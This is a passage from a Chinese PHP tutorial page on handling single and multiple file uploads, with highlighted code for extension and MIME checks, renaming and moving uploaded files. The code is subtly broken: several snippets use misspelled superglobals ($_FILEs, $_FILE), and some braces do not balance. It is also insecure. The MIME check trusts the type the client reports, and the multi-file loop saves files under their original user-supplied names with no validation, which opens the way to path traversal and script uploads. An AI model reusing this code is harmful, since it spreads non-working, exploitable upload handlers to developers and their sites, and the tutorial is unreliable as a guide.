spellcheck="true">//定义允许的后缀名数组</span><span class="token variable">$myImg</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*explode() 将一个字符串用指定的字符切割，并返回一个数组，这里我们将文件名用'.''切割,结果存在$myImg中，文件的后缀名即为数组的最后一个值*/</span><span class="token variable">$myImgSuffix</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$myImg</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*根据上传文件名获取文件的后缀名使用in_array()函数，判断上传文件是否符合要求当文件后缀名不在我们允许的范围内时退出上传并返回错误信息*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$myImgSuffix</span><span class="token punctuation">,</span> <span class="token variable">$allowSuffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"文件后缀名不符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*mime类型和文件后缀名的对应关系，我们可以通过很多途径查询到，为了避免用户自主修改文件后缀名造成文件无法使用。mime类型也必须做出限制检查mime类型，是为了防止上传者直接修改文件后缀名导致文件不可用或上传的文件不符合要求。*/</span><span class="token comment" spellcheck="true">//数组内容为允许上传的mime类型</span><span class="token variable">$allowMime</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>    <span class="token string">"image/jpg"</span><span class="token punctuation">,</span>    <span class="token string">"image/jpeg"</span><span class="token punctuation">,</span>    <span class="token string">"image/pjpeg"</span><span class="token punctuation">,</span>    <span class="token string">"image/gif"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allowMime</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                          <span class="token comment" spellcheck="true">//判断上传文件的mime类型是否在允许的范围内</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'文件格式不正确，请检查'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//如果不在允许范围内，退出上传并返回错误信息</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="3-4-生成指定的路径和文件名"><font color="#3CB371" face="Comic sans MS">3.4 生成指定的路径和文件名</font><a href="post/PHP-Upload#3-4-生成指定的路径和文件名"></a></h4><p>我们的文件上传成功了，不会让它保存原名。<br>因为，有些人在原名中有敏感关键词会违反我国的相关法律和法规。<br>我们可以采用<font color="#FF7F00">date()、mt_rand()</font>或者<font color="#FF7F00">unique()</font>生成随机的文件名。</p><blockquote><ol><li><font color="#FF7F00"><strong>$_FILES[“file”][“tmp_name”]：</strong></font>文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。</li><li>按照项目的文件安排，生成文件存储路径，为了避免文件名重复而产生的错误，按照一定的格式，生成一个随机文件名。</li></ol></blockquote><p>&emsp;<br>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//指定上传文件夹</span><span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">"upload/images/"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">/*根据当前时间生成随机文件名，本行代码是使用当前时间 + 随机一个0-9的数字组合成文件名，后缀即为前面取到的文件后缀名*/</span><span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'H'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token variable">$myImgSuffix</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="3-5-判断是否是上传文件"><font color="#3CB371" face="Comic sans MS">3.5  判断是否是上传文件</font><a href="post/PHP-Upload#3-5-判断是否是上传文件"></a></h4><p>使用函数：<font color="red"><strong>is_uploaded_file()</strong></font></p><blockquote><ol><li>文件上传成功时，系统会将上传的临时文件上传到系统的临时目录中。产生一个临时文件。</li><li>同时会产生临时文件名。我们需要做的事情是将临时文件移动到系统的指定目录中。</li><li>而移动前不能瞎移动，或者移动错了都是不科学的。移动前我们需要使用相关函数判断上传的文件是不是临时文件。</li><li><font color="#FF7F00"><strong>is_uploaded_file()</strong></font>传入一个参数($_FILES中的缓存文件名)，判断传入的名称是不是上传文件。</li></ol></blockquote><p>&emsp;<br>is_uploaded_file()函数是专用的函数，来判断目标文件是否是上传文件。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">//使用is_uploaded_file()判断是否是上传文件,函数介绍见上文</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILEs</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="3-6-移动临时文件到指定位置"><font color="#3CB371" face="Comic sans MS">3.6  移动临时文件到指定位置</font><a href="post/PHP-Upload#3-6-移动临时文件到指定位置"></a></h4><p>使用函数：<font color="red"><strong>move_uploaded_file()</strong></font>和数组元素：<font color="red"><strong>$_FILES[“file”][“tmp_name”]</strong></font></p><blockquote><ol><li>临时文件是真实的临时文件，我们需要将其移动到我们的网站目录下面,让我们网站目录的数据，其他人可以访问到。</li><li>我们使用：<font color="#FF7F00">move_uploaded_file()</font>。<br>这个函数是<font color="#FF7F00"><strong>将上传文件移动到指定位置，并命名</strong></font>。<br>传入两个参数：<br>第一个参数是指定移动的上传文件；<br>第二个参数是指定的文件夹和名称拼接的字符串。</li><li>需要注意的是，Linux系统中对目标目录是否有权限及磁盘空间是否足够，否则会导致上传操作失败。</li></ol></blockquote><p>&emsp;<br>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token comment" spellcheck="true">/*使用move_uploaded_file()移动上传文件至指定位置,第一个参数为上传文件，第二个参数为我们在前面指定的上传路径和名称。*/</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILEs</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>           <span class="token comment" spellcheck="true">//提示文件上传成功</span>           <span class="token keyword">echo</span> <span class="token string">"上传成功"</span><span class="token punctuation">;</span>                                       <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">/*文件移动失败，检查磁盘是否有足够的空间，或者linux类系统中文件夹是否有足够的操作权限*/</span>           <span class="token keyword">echo</span> <span class="token string">'上传失败'</span><span class="token punctuation">;</span>                                                       <span class="token punctuation">}</span>   <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>       <span class="token keyword">echo</span> <span class="token string">'不是上传文件'</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="四-多文件上传"><font color="#FF6347" face="Comic sans MS">四. 多文件上传</font><a href="post/PHP-Upload#四-多文件上传"></a></h3><p>多文件上传原理相同，<font color="#FF7F00"><strong>不过在处理数据时，需要对上传数据进行特殊处理</strong>。</font></p><p>&emsp;<br>示例：</p><pre class="line-numbers language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>单文件上传<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>morefile.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>         <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file[]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  //name比单文件上传时多了[]        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file[]<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  //name比单文件上传时多了[]        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>上传<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>这里是一个简易的上传页面，form表单同时提交了两个文件。我们 可以通过这个页面提交内容。<br><font color="#FF7F00"><strong>注意：</strong></font></p><ol><li>input type=”file” name=”file[]”与之前相比file后<font color="#FF7F00"><strong>多加了一个中括号</strong></font></li><li>写了2个或者多个input type=”file” name=”file[]”<br>我们使用 $_FILES 来接收文件信息，打印并查看数组：</li></ol></blockquote><p><font color="#FF7F00"></font></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//打印$_FILES查看数组结构 </span><span class="token delimiter">?></span>输出如下：<span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>      <span class="token string">'file'</span> <span class="token operator">=</span><span class="token operator">></span>          <span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>     <span class="token string">'name'</span> <span class="token operator">=</span><span class="token operator">></span>          <span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>         <span class="token comment" spellcheck="true">//文件名 </span>        <span class="token number">0</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'psu.jpg'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">)</span>         <span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'qwe.jpg'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">7</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//文件mime类型 </span>    <span class="token string">'type'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>             <span class="token number">0</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'image/jpeg'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>             <span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'image/jpeg'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//缓存文件 </span>    <span class="token string">'tmp_name'</span> <span class="token operator">=</span><span class="token operator">></span>          <span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>             <span class="token number">0</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'E:\wamp\tmp\phpF6D5.tmp'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">)</span>             <span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> string <span class="token string">'E:\wamp\tmp\phpF6F5.tmp'</span> <span class="token punctuation">(</span>length<span class="token operator">=</span><span class="token number">23</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//文件错误信息 </span>    <span class="token string">'error'</span> <span class="token operator">=</span><span class="token operator">></span>          <span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>             <span class="token number">0</span> <span class="token operator">=</span><span class="token operator">></span> int <span class="token number">0</span>             <span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> int <span class="token number">0</span>     <span class="token comment" spellcheck="true">//文件大小 </span>    <span class="token string">'size'</span> <span class="token operator">=</span><span class="token operator">></span>          <span class="token keyword">array</span> <span class="token punctuation">(</span>size<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>         <span class="token number">0</span> <span class="token operator">=</span><span class="token operator">></span> int <span class="token number">225824</span>             <span class="token number">1</span> <span class="token operator">=</span><span class="token operator">></span> int <span class="token number">151651</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><ol><li>我们可以看到，两个文件被存储在一个数组中，<font color="#FF7F00"><strong>键名和上传单文件是相同</strong></font>。所以，需要我们for()循环，来分别取出两个文件的需要用到的数据。</li><li>在$_FILES中同时保存了两个文件的数据，我们需要使用一个简单的循环，来读取单个文件的信息，并将文件移动到我们想要放的位置。</li></ol></blockquote><p>&emsp;</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* 用is_uploaded_file()函数判断是上传文件 并且没有出现错 */</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILEs</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILEs</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILEs</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">'upload/'</span><span class="token punctuation">.</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">//用move_uploaded_file()函数移动文件到指定的位置并使用文件原名 </span>   <span class="token keyword">echo</span> <span class="token string">"上传成功"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'上传失败'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">'上传失败'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h3 id="五-单文件上传完整代码"><font color="#FF6347" face="Comic sans MS">五. 单文件上传完整代码</font><a href="post/PHP-Upload#五-单文件上传完整代码"></a></h3><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'error'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">//错误码不为0，即文件上传过程中出现了错误</span> <span class="token keyword">case</span> <span class="token string">'1'</span><span class="token punctuation">:</span> <span class="token keyword">echo</span> <span class="token string">'文件过大'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string">'2'</span><span class="token punctuation">:</span> <span class="token keyword">echo</span> <span class="token string">'文件超出指定大小'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string">'3'</span><span class="token punctuation">:</span> <span class="token keyword">echo</span> <span class="token string">'只有部分文件被上传'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string">'4'</span><span class="token punctuation">:</span> <span class="token keyword">echo</span> <span class="token string">'文件没有被上传'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string">'6'</span><span class="token punctuation">:</span> <span class="token keyword">echo</span> <span class="token string">'找不到指定文件夹'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string">'7'</span><span class="token punctuation">:</span> <span class="token keyword">echo</span> <span class="token string">'文件写入失败'</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token keyword">echo</span> <span class="token string">"上传出错&lt;br/>"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token variable">$MAX_FILE_SIZE</span> <span class="token operator">=</span> <span class="token number">100000</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'size'</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token variable">$MAX_FILE_SIZE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"文件超出指定大小"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$allowSuffix</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string">'jpg'</span><span class="token punctuation">,</span> <span class="token string">'gif'</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$myImg</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$myImgSuffix</span> <span class="token operator">=</span> <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$myImg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$myImgSuffix</span><span class="token punctuation">,</span> <span class="token variable">$allowSuffix</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">"文件后缀名不符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$allowMime</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span> <span class="token string">"image/jpg"</span><span class="token punctuation">,</span> <span class="token string">"image/jpeg"</span><span class="token punctuation">,</span> <span class="token string">"image/pjpeg"</span><span class="token punctuation">,</span> <span class="token string">"image/gif"</span><span class="token punctuation">,</span> <span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$allowMime</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token string">'文件格式不正确，请检查'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token variable">$path</span> <span class="token operator">=</span> <span class="token string">"upload/images/"</span><span class="token punctuation">;</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'Y'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'m'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"d"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'H'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'i'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string">'s'</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">'.'</span> <span class="token punctuation">.</span> <span class="token variable">$myImgSuffix</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILEs</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILEs</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$path</span> <span class="token punctuation">.</span> <span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">"上传成功"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">'上传失败'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> <span class="token keyword">echo</span> <span class="token string">'不是上传文件'</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" 